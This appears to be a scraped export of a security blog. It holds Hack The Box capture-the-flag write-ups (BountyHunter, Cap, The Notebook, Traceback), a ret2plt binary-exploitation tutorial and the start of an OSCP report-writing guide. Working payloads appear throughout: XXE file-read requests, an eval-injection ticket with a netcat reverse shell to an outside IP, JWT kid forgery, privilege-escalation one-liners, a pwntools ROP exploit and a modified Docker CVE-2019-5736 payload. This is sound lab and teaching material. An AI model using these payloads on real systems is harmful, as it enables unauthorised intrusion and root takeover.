[{"id":0,"href":"/posts/bountyhunter/","title":"BountyHunter - WriteUp","section":"Blog","content":" External Recon # We start with nmap to do our external recon:\nNmap scan report for 10.129.192.33 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We find a ssh service on port 22 and http service on port 80. http is usually a better target as ssh. So I start there. The website boast a bounty hunter service. First I click on all visible links and menus to get a feeling for the website. What works, what doesn\u0026rsquo;t work. But interfaces do I have - like input fields for example.\nThe only thing that sticks out is the \u0026ldquo;portal\u0026rdquo; page.\nIt\u0026rsquo;s under development. An indicator that not all features (like propper coding) are ready. The \u0026ldquo;Go here\u0026rdquo; link leads us to a bounty Report system which seems to be in a beta stadium.\nBefore we start messing with the system, which might take a bit, I started gobuster to do some background recon.\ngobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,htm,php I\u0026rsquo;ll show you the output later when it becomes relevant. Let\u0026rsquo;s focus on the bounty report system for now. First let\u0026rsquo;s feed it with legitimate data.\nFrom the output we can determine that the system will use a database in the future and that our data gets displayed back to us. Nothing crazy on the surface. To look under the hood we need a tool like burp and use it as our proxy (google is your friend).\n[Top]\nExplore # After sending the same data again, we can capture the request with burp and take look at it.\nInteressting: We send the data to a page with a funky name:\nPOST http://10.10.11.100/tracker_diRbPr00f314.php The next interessting piece of information is the custom X-Header:\nX-Requested-With: XMLHttpRequest So we are sending XML data. However our payload looks more like base64 than XML.\ndata=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5BIEJ1ZzwvdGl0bGU%2BCgkJ [...snip...] With burp we can decode the data and make it human readable.\nSo we do in fact have XML formated data. Seeing this, my gut feeling is, we should try XML-Entity-Injection or XXE.\nBefore we do something complex we should try it with a simple proof of concept first. Like reading a file from the webserver. We know it\u0026rsquo;s a linux box, so /etc/passwd is a good candidate. Furthermore, I made an /etc/hosts entry for that box, so I can usea hostname instead of an IP. It helps sometimes.\nI send the request to burps \u0026ldquo;repeater\u0026rdquo; module and changed the XML-data to read a file and include it in one of the properties that get displayed back to us.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;1234\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;1234\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;1234\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt; If we send this request we will indeed get the contents of /etc/passwd.\n[Top]\nExploit # Since we can read files from the system now, how can we use that to our advantage? First of all there is a user called \u0026ldquo;development\u0026rdquo; on the box. I tried reading his ssh key, but wasn\u0026rsquo;t successfull. Maybe our gobuster search in the background can help us?\n=============================================================== 2021/07/28 18:48:15 Starting gobuster =============================================================== /index.php (Status: 200) /resources (Status: 301) /assets (Status: 301) /portal.php (Status: 200) /css (Status: 301) /db.php (Status: 200) /js (Status: 301) We have three files with a status code of 200. The last one db.php sounds very promissing. If we adapt our proof of concept above to read db.php we will get nothing. This could be because the file is not in the current working directory or more likly because it is a .php file. It gets interpreted from the webserver and won\u0026rsquo;t display it\u0026rsquo;s content to us. But we can use a php-filter in our XXE attack to encode the data to base64 first.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=db.php\u0026#34;\u0026gt;]\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;1234\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;1234\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;1234\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt; And there we have it. Some base64 encoded data. Decoding it gives us some credentials. Since password reuse is a thing, I\u0026rsquo;ll try to use it to ssh into the machine as the user \u0026ldquo;development\u0026rdquo;.\n\u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; $testuser = \u0026#34;test\u0026#34;; ?\u0026gt; [Top]\nRecon # After a successful login via ssh, I checked my group memberships and also if I can run anything as root/sudo. And as you can see, we can indeed run a python script as root via sudo.\nLet\u0026rsquo;s read and analyse the code:\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\u0026#34;.md\u0026#34;): return open(loc, \u0026#39;r\u0026#39;) else: print(\u0026#34;Wrong file type.\u0026#34;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;): return False continue if i == 1: if not x.startswith(\u0026#34;## Ticke![user-sudo.png](user-sudo.png) print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;) continue if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\u0026#34;**\u0026#34;): return False ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) if validationNumber \u0026gt; 100: return True else: return False return False def main(): fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\u0026#34;Valid ticket.\u0026#34;) else: print(\u0026#34;Invalid ticket.\u0026#34;) ticket.close main() The script reads a file with a \u0026ldquo;.md\u0026rdquo; extention and checks if the string # Skytrain Inc is in the first line of that file. Next it checks if the string ## Ticket to is on the second line. The third line of the \u0026ldquo;.md\u0026rdquo; file needs to be __Ticket Code:__. The fourth line needs to start with ** and needs to contain a number. But not any number, it needs to be a number that you can divide by 7 and get a remainder of 4. A simple modulus operation. \u0026ldquo;102\u0026rdquo; should work. If all those requirements are met, the script will output \u0026ldquo;Valid ticket\u0026rdquo; or otherwise \u0026ldquo;Invalid ticket\u0026rdquo;.\nLet\u0026rsquo;s craft a valid ticket file first as a proof of concept.\n# Skytrain Inc ## Ticket to __Ticket Code:__ ** 102 ** As you can see, we provided a valid ticket file. You might notice that the \u0026ldquo;Destination\u0026rdquo; is empty. This is because I haven\u0026rsquo;t provided one. This is not needed to make the exploit work. But it looks nicer. So the next interation of the ticket file will have \u0026ldquo;development\u0026rdquo; in the \u0026ldquo;Ticket to\u0026rdquo; field.\n[Top]\nPrivilege Escalation # But now we need to think about a way to exploit this. If you read the code again, you might notice the eval() function close to the end of the script. This function can be used to run python commands, like a system call. And since we are allowed to run the script as root those system calls are also running as root.\nA couple of lines earlier we can see that the script get the ticket code by splitting the fourth line at a \u0026ldquo;+\u0026rdquo; symbol. So, if we provide a python command, in the fourth line after the ticket code, separated by a \u0026ldquo;+\u0026rdquo; sign, we should get code execution. Let\u0026rsquo;s build a new ticket file with a python reverse-shell and start a netcat listener on port 1337.\n# Skytrain Inc ## Ticket to development __Ticket Code:__ ** 102 + __import__(\u0026#39;os\u0026#39;).system(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.39 1337 \u0026gt;/tmp/f\u0026#39;) ** And there we have it.\nHave a good one!\nx41\n[Top]\n"},{"id":1,"href":"/posts/cap/","title":"Cap - WriteUp","section":"Blog","content":" External Recon # As always we start to get a lay of the land with our default \u0026ldquo;nmap\u0026rdquo; scan:\nnmap -sC -sV 10.10.10.245 PORT STATE SERVICE VERSION PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 80/tcp open http gunicorn Nothing unusual so far. However, since we have some version numbers let\u0026rsquo;s check them with searchsploit.\nNothing for vsftp. OpenSSH looks quite new but I suggest checking it aswell. I just made a mental note to come back to SSH should other paths seem to be a dead end. Gunicorn had no version number, so I skipped the searchsploit aswell. But we can take a look at the website itself.\n[Top]\nExplore # First thing I noticed is the authenticated user named \u0026ldquo;Nathan\u0026rdquo;. Could be handy if we want to bruteforce SSH or FTP. I actually tried bruteforcing FTP with the username \u0026ldquo;nathan\u0026rdquo; and the \u0026ldquo;rockyou\u0026rdquo; wordlist. But I got blacklisted. So that was a dead end.\nLet\u0026rsquo;s play with the webapp. I tried to logout and view the settings. But these functions are not implemented. So nothing to gain here. The next thing I looked at was the menu entry \u0026ldquo;IP Config\u0026rdquo; and \u0026ldquo;Network Status\u0026rdquo;.\nBoth entries return console output of the kind you would expect. IP Config returned the IP Config of the box for example. Sometimes developers try to be efficient and pass parameters from the website to the backend. A perfect target for code injection. Not this time though. Both outputs seemed to be static and not triggered by some sort of PHP script.\nI then took a look at the last entry \u0026ldquo;Security Snapshot\u0026rdquo;. On the website I got some network traffic statistics and an option to download a pcap file of said traffic.\nIn the screenshot above you can see, there was no traffic. And the pcap was also empty. Hm. What now?\nWell. We know that \u0026ldquo;Nathan\u0026rdquo; logged in at some point. Maybe we can find some credentials in the pcap? Looking at the URL bar, we can see that there\u0026rsquo;s a \u0026ldquo;3\u0026rdquo; behind the folder \u0026ldquo;data\u0026rdquo;. And the pcap-name we downloaded aligns with that number.\nLet\u0026rsquo;s check if there\u0026rsquo;s a \u0026ldquo;2.pcap\u0026rdquo;. And there is. Albeit empty too.\nThere\u0026rsquo;s even a \u0026ldquo;0.pcap\u0026rdquo;. And this one has indeed data in it. Let\u0026rsquo;s download it and open it with wireshark.\nAwesome. We have his FTP credentials.\n[Top]\nExploit # Let\u0026rsquo;s login with our new credentials via SSH. Why SSH? Well, it\u0026rsquo;s an easy box. Nathan probably reused his password, and SSH is far more interessting than FTP. And if it doesn\u0026rsquo;t work, we can come back to FTP.\nTold you. Oh, we also have the user flag here.\n[Top]\nInternal Recon # Once I am on a machine, I do two things. I check if sudo -l gives me some insights and I upload linpeas.sh. To do that I fire up a simple http server on my own machine with python3 -m http.server 80 and download the file via wget http://\u0026lt;ip\u0026gt;/linpeas.sh.\nAfter launching it and going through the output my eyes fell on this entry.\n[Top]\nPrivilege Escalation # Capabilities are often easy to exploit. They are explained here. In this case python3 has been allowed to change the UID of a new process. Which means we can start a new process, let\u0026rsquo;s say /bin/sh, with UID 0 aka root - we will have root permissions.\nLet\u0026rsquo;s try it.\npython3 -c 'import os; os.setuid(0); os.system(\u0026quot;/bin/sh\u0026quot;)'\nGreat. It worked as expected. We can take the root flag and finish the box.\nThat\u0026rsquo;s it for today. Have a nice one!\nx41\n[Top]\n"},{"id":2,"href":"/posts/the-notebook/","title":"The Notebook - WriteUp","section":"Blog","content":" External Recon # We start our external recon with an nmap scan. Only two ports are open with a third one filtered.\nnmap -sC -sV -oN inital 10.10.10.230 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper 10010/tcp filtered rxapi The most interessting service so far is http on port 80. Let\u0026rsquo;s take a peek there.\nLooks like an app to take notes. We could try to bruteforce the login page. But I would rather explore the app first. Let\u0026rsquo;s register an account.\n[Top]\nExplore # Once the account has been created we can explore the various parts of the webapp and create notes. I even tried some simple injections with single quotes etc. but the app seems not vulnerable to those attacks.\nLet\u0026rsquo;s check how the application handles authentication. F12 to open the developer tools of the browser and check the storage tab where our access tokens are stored.\nFirst thing I notice is the \u0026ldquo;auth\u0026rdquo; token. It starts with eyJ and this is indicative for \u0026ldquo;JWT-Tokens\u0026rdquo;. This page has a nice decoder.\nOn the top-right we can see the header. And it already leaked some interessting information. The parameter kid or key-id holds the information about the private-key used to sign this token.\nOn the bottom-right we see our login data. And as the admin_cap paramater states, we are not an admin. We would like to change that though. We can edit the token and change the 0 to a 1. But that would invalidate the signature. At least if the application in the backend checkes the signature. After playing with the token a bit, it seemed like it does check the signature. So we have to find a way to sign the token with a valid key.\nMaybe the application allows us to inject our own value in the kid parameter. This way we could host a webserver with our own keys, which we would use to sign our forged token.\n[Top]\nExploit # Let\u0026rsquo;s start with a proof of concept. We will change the kid parameter (you can use the website above) to our IP and start a webserver with python3 -m http.server 7070 and see if we get a request from the server. Then copy the changed token into your browser.\nFantastic. The webserver tried to verify the key by following the outbound url. Let\u0026rsquo;s now change the admin_cap parameter to 1. If you used the site above, it already created a key-pair for you. Just take the public key and save it in your web-root so that the webrequest from the server can read it. At the end of this writeup, I\u0026rsquo;ll show you an alternative way of forging that token.\nOnce you\u0026rsquo;re done with the setup and hit refresh in your browser, you should get access to the admin-panel and you should be able to read all notes.\nThe admin panel itself gives you an option to upload a file. We could try to upload a php reverse shell on the box to get in. The notes even tell you that there\u0026rsquo;s a \u0026ldquo;problem\u0026rdquo; that php files are being executed. The fix is pending. So, this has to be the way in.\nLet\u0026rsquo;s grab a good php-reverse shell and open a netcat listener. Don\u0026rsquo;t stop your webserver just yet. It\u0026rsquo;s still needed to stay authenticated.\nWe have a shell. Let\u0026rsquo;s upgrade our shell to a propper tty with python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' then ctrl-z to background the shell. Then type stty raw -echo and hit enter followed by fg and enter twice. Now you should be back. Last step is export TERM=xterm.\n[Top]\nInternal Recon # Now that we are in, we need to find a way to escalate our privileges. A look into /etc/passwd reveals a user named \u0026ldquo;noah\u0026rdquo;. We\u0026rsquo;ve seen this name in the notes on the website before. He just managed to setup his backup. With find / -type d -name \u0026quot;*backup*\u0026quot; we can search for a folder named \u0026ldquo;backup\u0026rdquo; and will show a folder where we have access to: /var/backups.\nIn there is a tar.gz backup of noah home directory. We will copy it to /tmp and unpack with tar -xvzf. Inside we find a noahs ssh-key. A quick chmod 600 on it is enough to make it work for us.\nHere we also find the user.txt.\n[Top]\nPrivilege Escalation # Now it\u0026rsquo;s time dig deeper and find a way to get root. Let\u0026rsquo;s start with the basics: sudo -l.\nWe can run a single command as sudo without password. In this case a docker command. Run docker --version to check which docker version is installed:\nDocker version 18.06.0-ce, build 0ffa825 This is an old version. After a small google search we can assume this docker version is vulnerable against CVE-2019-5736. I picked this exploit, mainly because it\u0026rsquo;s easy to edit and compile.\nTo set it up we clone the git repo to our box. Then we need to change the exploit to fit our needs. The exploit, as is, will copy the /etc/shadow file and make it readable. But this is not what we want. We can copy the authorized_keys file from noah in the home directory of root.\nSo changing the payload to this should do the trick.\nvar payload = \u0026quot;#!/bin/bash \\n cat /home/noah/.ssh/authorized_keys \u0026gt;\u0026gt; /root/.ssh/authorized_keys\u0026quot;\nWe compile the exploit with go build main.go and rename the binary from main to exploit.\nNow, for this to work you need three terminals. In the first one you need to get into the docker container via sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash. Here you will grab your exploit via wget from your local python webserver and chmod +x and launch it via ./exploit.\nIn the second terminal windows you will ssh into the box with noah again and then trigger the exploit via sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh.\nIn the third window you can now try to ssh into the box as root with the rsa key of noah. The following screenshot shows this setup after the exploit successfully triggered.\nAnd that\u0026rsquo;s it. We\u0026rsquo;ve rooted a medium difficulty machine once again.\nBonus Content # As promissed here\u0026rsquo;s an alternative way to mess with the token. First we need to create a key-pair with ssh-keygen.\nssh-keygen -t rsa -b 4096 -m PEM -f jwt.key Then we get a copy of the jwt-tool.\nWhich in turn can be used to edit and sign the token.\npython3 jwt_tool.py [eyJ0eXAiOiJKV1QiLCJhbG..snip..] -I -hc kid -hv \u0026#34;http://10.10.16.4:7070/jwt.pub\u0026#34; -pc admin_cap -pv 1 -S rs256 -pr jwt.key You can do a lot of more things with jwt_tool. But that\u0026rsquo;s another topic.\nHave a nice one.\nx41\n[Top]\n"},{"id":3,"href":"/posts/traceback/","title":"Traceback - WriteUp","section":"Blog","content":" External Recon # Welcome to my first box and writeup since my OSCP. We start with a nmap scan as usual:\nWebsite # Checking the website it seems like somebody already defaced the website.\nWe find a little hint in the sourcecode.\nA google search on \u0026ldquo;webshells + Xh4H\u0026rdquo; reveals a github repository with a bunch of webshells. And sure enough we try all of them on our target.\nThe smevk webshell works!\nChecking the github repository for credentials reveals admin:admin in the config.\nAfter logging in the next step was to upload a propper php-reverse-shell to get some sane control over the machine.\nI created a nc listener on port 9001 and called the reverse-shell via the browser.\nUser PrivEsc # As seen in the above screenshot, we have webadmin permissions. So let\u0026rsquo;s go and check his home directory.\nThe user Sysadmin left a note about a tool webadmin might want to practice with. Running sudo -l leaked the tool in question and the info that we can run it without the password from Sysadmin.\nFuther investigation reveal more useful information. In the history-file you can see how the command was used by the attacker that defaced the box.\nIt looks like a .lua file is needed and can be passed as an argument to the luvit tool from \u0026ldquo;sysadmin\u0026rdquo;. I checked the gtfobins website to see what I can do with lua.\nAfter creating a file with os.execute(\u0026quot;/bin/bash\u0026quot;) as content and naming the file privesc.lua, I was able to privesc to Sysadmin and capture the user flag.\nEnumeration of Sysadmin # With the new privileges at hand I uploaded two of my goto tools to the system. LinPEAS and pspy64. Neither disappoint in this scenario. I sifted through the LinPEAS output and found some very promissing information.\nPspy64 confirmed that something is about the motd (motto-of-the-day) files as they are constantly restored by a cronjob.\nBefore we move on to root the box I went and created an ssh-key for sysadmin to get a better and more stable shell. After logging in I noticed the custom banner from the initial attacker.\nRoot # So after enumerating the Sysadmin-User I checked the motd files. The 00-header file was particilar interessting.\nIf you check the very last line you can see that it\u0026rsquo;s the same we saw after using our ssh-key for Sysadmin. The privesc path should be clear at this point.\nThe motd files are essentially bash-scripts and Sysadmin can edit them. But they are run by root once you log in via ssh.\nSo I appended a reverse-shell to the 00-header file and had a listener ready to capture the shell. As we know through our enumeration, the file will be restored every couple of seconds. So we need to be quick.\nAppend the shell, login as Sysadmin and capture the shell.\nEasy as that. :)\nSee you in a bit!\nx41\n"},{"id":4,"href":"/posts/ret2plt-exploit/","title":"Exploit-Development - ret2plt","section":"Blog","content":" Introduction # In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques. Part of this learning process is to explain what I\u0026rsquo;ve learned to others. If you find an error, please let me know.\nAlso: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the ROPEmporium challenges. I highly recommend them because they will teach some fundamentals we will use for bypassing another common protection, which is ASLR or Address Space Layout Randomization.\nThe first technique I am explaining is the ret2plt or \u0026ldquo;Return to Procedural Linkage Table\u0026rdquo;.\nWhat\u0026rsquo;s PLT? # In modern operating systems we have a lot of programming libraries. The most known one in linux is libc. It stores most of the common functions a program will need to run properly. For example the printf() or puts() function. Once a progam is started the libc library is dynamicaly linked into that program. Which means the program, could use all the functions in libc.\nTo find the function, let\u0026rsquo;s say printf(), within libc the program needs to know the memory location of the function is at runtime. But this is a shared library, other programs would also like to use printf(). But these programs run in their own process and have their own virtual address space. So the addresses can\u0026rsquo;t be the same.\nOne solution to this problem could be, to host multiple copies of printf() for each process. But, as you can imagine - that\u0026rsquo;s quite inefficent. Another solution is to introduce a small process specific memory area to store a little stub that points to the real printf(). As this area isn\u0026rsquo;t shared with other processes, it can simply be changed by the process to whatever it wants.\nThis stub, is the PLT. When opening a debugger later, we will see these stubs everywhere. They might look like this: printf@plt. In a future blog post, I\u0026rsquo;ll introduce another component to this. Which is the GOT or Global Offset Table.\nIf this explaination is to much for you right now, I suggest taking a look at this blog post. The author has some nice pictures that might help you understand this a bit better.\nThe main take away should be: Functions are called with a level of indirection. A call to printf() will first call printf@plt.\nWhy does this matter? # This matters because we want to bypass a protection mechanism called ASLR, which randomizes the memory location of certain parts of a process. Because of this randomization, we can\u0026rsquo;t hardcode a memory addresses into our exploits anymore. They will change once a process restarts. What we can do though, is use the stubs addresses instead, which then resolve to the real function address we want to call.\nBefore you get even more confused, let\u0026rsquo;s go and play with an example.\nThe Target # This is our target progam we will attack today.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char desc[100]; system(\u0026#34;clear\u0026#34;); printf(\u0026#34;Can you make me crash\u0026#34;); scanf(\u0026#34;%s\u0026#34;,desc); return(0); } This code takes user provided data via the unsafe function scanf(). The buffer for the data is 100 bytes. Let\u0026rsquo;s compile this code and run it:\n# -fno-stack-protector = compile without \u0026#34;stack canaries\u0026#34; security mechanism # -no-pie = compile without \u0026#34;Position Independent Executabe (PIE)\u0026#34; security mechanism gcc ret2plt.c -o ret2plt -fno-stack-protector -no-pie ./ret2plt Nice. An almost useless program.\nFirst Crash # The next part is of cause to make it crash. We know from the source code that 100 bytes are the maxium assigned buffer. So let\u0026rsquo;s give it 300 bytes.\npython3 -c \u0026#39;print(\u0026#34;A\u0026#34; * 300)\u0026#39; We confirmed it\u0026rsquo;s crashing when a large input is given. The next part step is to examine when the crash happend exactly. If you are not familiar with this process you should read my OSCP buffer-overflow article. This is just the setup we always need to do, regardless of technique used.\nFinding the Offset # To find the offset where the crash is happening I use gdb with the gef extention.\ngdb ./ret2plt Once gdb is up, I set a brakepoint in the main function.\nb main Next we generate a non repeating pattern of 300 bytes.\npattern create 300 We copy the output, then r to run the program. We will hit our breakpoint and the program will be paused. Hit c to continue. You should get the password-promt now. Paste the pattern you\u0026rsquo;ve copied and hit enter.\nAs expected, the program crashed again.\nExamine the different sections of the gdb output. You can see the stack full of our sent pattern. You can also observe that we are stuck at a ret instruction and most importantly, that we have overwritten the $rsp register.\nCopy the pattern (without \u0026ldquo;[\u0026hellip;]\u0026rdquo;) and run the next command:\npattern search \u0026lt;pattern\u0026gt; Ok. We know, that the overflow happens after 120 bytes of input. We can start writing our exploit now.\nWriting the exploit # I am using the pwntools library which is very nice and helpful. Again, google is your friend. After importing pwntools we need to specify which progam we want to run. We also set the os we are running currently and the architecture. This is just some pwntools stuff. But let\u0026rsquo;s comment that out for now. We will upgrade the exploit at the end and come back to this.\nNext we define our junk value of 120 bytes. And lastly we write our payload to a file on disk.\n#!/usr/bin/python3 from pwn import * # pwntools stuff for later #p = process(\u0026#39;./ret2plt\u0026#39;) #context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;adm64\u0026#39;) junk = b\u0026#34;A\u0026#34; * 120 with open(\u0026#34;payload\u0026#34;, \u0026#34;wb\u0026#34;) as w: w.write(payload) But what now?\nSo, we probably want to get a shell through this vulnerability right? Which in turn means, we need to use a function that executes a shell or sh for us. The first function that comes to mind is system().\nWhen you review the source code of our target we see, the system() function is already present. But the argument \u0026ldquo;clear\u0026rdquo; won\u0026rsquo;t help us with the shell. We need to call system() with our own argument. Like sh. Conveniently I placed the string \u0026ldquo;sh\u0026rdquo; into the code in the word \u0026ldquo;crash\u0026rdquo;.\nSo our next steps are clear, find the location of \u0026ldquo;sh\u0026rdquo; and system() in our binary.\nFinding \u0026ldquo;sh\u0026rdquo; # Finding \u0026ldquo;sh\u0026rdquo; is rather easy. Start the program with gdb as before. Set a breakpoint in main and hit run. Once the breakpoint is reached just do:\ngrep sh You will get a long list of different \u0026ldquo;sh\u0026rdquo; places. But pay attention where they have been found. Most of them are found in libc. Which is not the target for todays mission. Scroll up and you will find something like this:\nSo we have the location of the string \u0026ldquo;sh\u0026rdquo;. Luckily we have two locations. The first one has 0x20 in it which is a bad character. We have to use the one with the 0x30 in it instead. Let\u0026rsquo;s update our exploit with the new information.\n#!/usr/bin/python3 from pwn import * # pwntools stuff for later #p = process(\u0026#39;./ret2plt\u0026#39;) #context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;adm64\u0026#39;) junk = b\u0026#34;A\u0026#34; * 120 sh = p64(0x40301d) with open(\u0026#34;payload\u0026#34;, \u0026#34;wb\u0026#34;) as w: w.write(payload) Next on our list is system(). This is also easy to find. We quit out of gdb and run:\nobjdump -d ret2plt | grep system The result should look like this:\nWe are interessted in the first line. This is the address of system@plt. This address is not randomized. And this is also our stub to the real system(). Let\u0026rsquo;s put that also into our exploit.\nAre we good? No yet. One last piece is missing. We are running all this on a 64 Bit system. Which means that arguments to a function, like \u0026ldquo;sh\u0026rdquo; for system(), needs to be passed via the $rdi register.\nHow do we get it in there? Glad you asked. As DEP is also enabled and we can\u0026rsquo;t execute data from the stack anyways we have to use a ROP technique aswell. We need a pop rdi; ret instruction that\u0026rsquo;s already present within our binary.\nWe can search for one with the tool ROPGadget like so:\nROPgadget --binary ret2plt | grep rdi Hint: it\u0026rsquo;s the second line. ;)\nLet\u0026rsquo;s update our exploit again and while we are at it, let\u0026rsquo;s build our payload at the same time. The finished exploit looks like this now:\n#!/usr/bin/python3 from pwn import * # pwntools stuff for later #p = process(\u0026#39;./ret2plt\u0026#39;) #context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;adm64\u0026#39;) junk = b\u0026#34;A\u0026#34; * 120 sh = p64(0x40301d) system = p64(0x401030) pop_rdi = p64(0x4011eb) payload = junk + pop_rdi + sh + system with open(\u0026#34;payload\u0026#34;, \u0026#34;wb\u0026#34;) as w: w.write(payload) Will it work though? # Let\u0026rsquo;s run the exploit and check if an file called \u0026ldquo;payload\u0026rdquo; has been created. If so, let\u0026rsquo;s run the following command:\n(cat payload;cat) | ./ret2plt You should get a blank terminal. Hit enter, and then type id or ls or whatever shell command you want. ;) I typed ls twice as you can see:\nNice. We\u0026rsquo;ve got a shell. =)\nWtf happend? # Let\u0026rsquo;s open the target program in gdb once more, set a breakpoint at main() and r \u0026lt; payload to feed it our payload.\nOnce we hit our breakpoint, single-step trough the program with s. Everytime you enter a function, you can rush through it with finish. However, pay attention to the \u0026ldquo;code\u0026rdquo; section, once you step out of scanf(), we want to observe what\u0026rsquo;s happening.\nLet\u0026rsquo;s go slower now.\nOnce we are back in main() we can see our payload on the stack.\nAlso we see that we are about to leave the main() function.\nSingle-step twice. Once we hit the ret we can see what\u0026rsquo;s happening next. First of all, the next instruction is pop rdi, followed by a ret. Sounds familiar?\nNow check the stack. After the pop rdi comes sh.\nSingle-Step through this slowly and see how the process unfolds.\npop rdi will be put into $rip Address of \u0026ldquo;sh\u0026rdquo; will be put into $rdi ret will be executed system will be called next Exactly how we planed it.\nUpdates # Let\u0026rsquo;s make our exploit and the shell a bit more shiny. First we uncomment the pwntools line we already have at the top.\nNext we remove the write function and introduce the last two lines of this finish exploit code:\n#!/usr/bin/python3 from pwn import * # pwntools stuff for now p = process(\u0026#39;./ret2plt\u0026#39;) context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;adm64\u0026#39;) junk = b\u0026#34;A\u0026#34; * 120 sh = p64(0x40301d) system = p64(0x401030) pop_rdi = p64(0x4011eb) payload = junk + pop_rdi + sh + system p.sendline(payload) p.interactive(\u0026#34;\u0026gt; \u0026#34;) That\u0026rsquo;s all for now. Run the exploit and you should get a shell that\u0026rsquo;s a bit nicer.\nLast words # That\u0026rsquo;s it for today. I hope this was somewhat understandable and helps you writing own exploits. Of cause you can download all the code from my github.\nIn the next days I would like to write another article that take this a bit further. What happens if we don\u0026rsquo;t have system() nor \u0026ldquo;sh\u0026rdquo; at our disposal? What can we do then? If you want to know the answer, come back in a couple of days. ;)\nx41\n"},{"id":5,"href":"/posts/oscp-reporting/","title":"Path to OSCP - Reporting","section":"Blog","content":" Introduction # I had to write a report for the OSCP exam and I was asked to explain my personal setup and the process of writing the report.\nSetup all the things # First we need to install the following tools:\nJoplin (optional) Latex Pandoc Eisvogel Latex Template Noraj Markdown OSCP Template Install Joplin # Depending on your operating system you need to use a different installer. Just go to Joplin.org and follow the instructions for your scenario.\nInstall Latex # To install Latex on Kali Linux I followed this \u0026ldquo;guide\u0026rdquo; on StackExchange.com. I was also very lazy and just installed texlive-full because I didn\u0026rsquo;t spent time on figuring out which packages our template uses. But be aware, lexlive-full is about 5 GB in size.\nInstall Pandoc # Next on our list is pandoc. They do have a guide on how to install it and build it from source on their website. If that\u0026rsquo;s your way of doing things, go there and read the docs. But I like to use the package manager of my OS to deal with installing software. So a\napt update; apt 